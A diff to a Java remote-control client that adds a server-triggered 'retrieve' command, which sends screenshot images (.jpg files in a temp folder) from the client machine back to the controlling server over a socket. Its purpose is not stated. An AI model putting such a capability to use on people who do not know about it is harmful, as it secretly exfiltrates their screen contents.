@@ -87,6 +87,24 @@ public class Client
         return sound;
     }
 
+    /**
+     * for sending data on the clients machine back to the server. e.g. screenshots
+     * @param toSend the file that needs to be sent
+     * @throws IOException if something went wrong sending the file
+     */
+    public void sendFile(File toSend) throws IOException
+    {
+        byte[] buffer = new byte[(int)toSend.length()]; // todo: better way of sizing
+        InputStream in = new FileInputStream(toSend);
+        OutputStream out = socket.getOutputStream();
+
+        int count;
+        while ((count = in.read(buffer)) > 0)
+            out.write(buffer, 0, count);
+
+        out.flush();
+        in.close();
+    }
 
     /**
      * calls the appropriate method on the CommandSet depending on what the server wants us to do to
@@ -129,8 +147,31 @@ public class Client
                 break;
             case "type":
                 commandSet.type(serverCommand[1]);
+                break;
+            case "retrieve":
+                sendAllImages();
+                break;
             default:
                 System.out.println("Reached default in processSErverCommand with cmd: " + serverCommand);
+        }
+    }
+
+    private void sendAllImages()
+    {
+        File[] allImages = new File(commandSet.getTempPath()).listFiles();
+        for(File file : allImages)
+        {
+            if(file.getName().endsWith(".jpg"))
+            {
+                try
+                {
+                    sendFile(file);
+                }
+                catch(IOException ioe)
+                {
+                    ioe.printStackTrace();
+                }
+            }
         }
     }
 }
